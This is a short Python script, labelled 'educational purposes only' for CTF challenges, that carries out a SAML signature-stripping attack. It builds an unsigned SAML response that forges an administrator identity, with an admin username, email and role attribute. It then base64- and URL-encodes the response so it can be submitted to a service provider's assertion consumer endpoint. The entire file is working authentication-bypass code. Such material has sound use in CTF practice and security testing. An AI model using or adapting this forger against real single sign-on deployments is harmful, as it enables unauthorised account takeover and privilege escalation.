#!/usr/bin/env python3
"""
SAML Signature Stripping Attack Script
Educational purposes only - for CTF challenges
"""

import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
import base64
import urllib.parse

def create_unsigned_saml_response(username="admin", email="admin@example.com", issuer="https://idp.example.com"):
    """Create an unsigned SAML response with forged user data"""
    
    # Create Response element
    response = ET.Element('samlp:Response', {
        'xmlns:samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'xmlns:saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'ID': f'_response_{datetime.now().strftime("%Y%m%d%H%M%S")}',
        'Version': '2.0',
        'IssueInstant': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z',
        'Destination': 'https://sp.example.com/acs'
    })
    
    # Add Status
    status = ET.SubElement(response, 'samlp:Status')
    status_code = ET.SubElement(status, 'samlp:StatusCode', {'Value': 'urn:oasis:names:tc:SAML:2.0:status:Success'})
    
    # Create Assertion (unsigned!)
    assertion = ET.SubElement(response, 'saml:Assertion', {
        'ID': f'_assertion_{datetime.now().strftime("%Y%m%d%H%M%S")}',
        'Version': '2.0',
        'IssueInstant': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z'
    })
    
    # Issuer
    issuer_elem = ET.SubElement(assertion, 'saml:Issuer')
    issuer_elem.text = issuer
    
    # Subject with forged user
    subject = ET.SubElement(assertion, 'saml:Subject')
    name_id = ET.SubElement(subject, 'saml:NameID', {'Format': 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'})
    name_id.text = email
    
    # Subject Confirmation
    subject_confirmation = ET.SubElement(subject, 'saml:SubjectConfirmation', {'Method': 'urn:oasis:names:tc:SAML:2.0:cm:bearer'})
    subject_confirmation_data = ET.SubElement(subject_confirmation, 'saml:SubjectConfirmationData', {
        'NotOnOrAfter': (datetime.utcnow() + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z',
        'Recipient': 'https://sp.example.com/acs'
    })
    
    # Conditions
    conditions = ET.SubElement(assertion, 'saml:Conditions', {
        'NotBefore': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z',
        'NotOnOrAfter': (datetime.utcnow() + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z'
    })
    
    # Authentication Statement
    authn_statement = ET.SubElement(assertion, 'saml:AuthnStatement', {
        'AuthnInstant': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%fZ')[:-3] + 'Z'
    })
    authn_context = ET.SubElement(authn_statement, 'saml:AuthnContext')
    authn_context_class_ref = ET.SubElement(authn_context, 'saml:AuthnContextClassRef')
    authn_context_class_ref.text = 'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
    
    # Attribute Statement with admin privileges
    attr_statement = ET.SubElement(assertion, 'saml:AttributeStatement')
    
    # Username attribute
    username_attr = ET.SubElement(attr_statement, 'saml:Attribute', {'Name': 'username'})
    username_value = ET.SubElement(username_attr, 'saml:AttributeValue')
    username_value.text = username
    
    # Role attribute (admin)
    role_attr = ET.SubElement(attr_statement, 'saml:Attribute', {'Name': 'role'})
    role_value = ET.SubElement(role_attr, 'saml:AttributeValue')
    role_value.text = 'admin'
    
    # Convert to string
    xml_string = ET.tostring(response, encoding='unicode')
    return xml_string

def encode_saml_response(xml_string):
    """Base64 encode the SAML response for HTTP transmission"""
    return base64.b64encode(xml_string.encode()).decode()

if __name__ == "__main__":
    # Create forged SAML response
    forged_response = create_unsigned_saml_response("admin", "admin@ctf.com")
    encoded_response = encode_saml_response(forged_response)
    
    print("=== Forged SAML Response (Unsigned) ===")
    print(forged_response)
    print("\n=== Base64 Encoded for HTTP ===")
    print(encoded_response)
    print("\n=== URL Encoded ===")
    print(urllib.parse.quote(encoded_response))
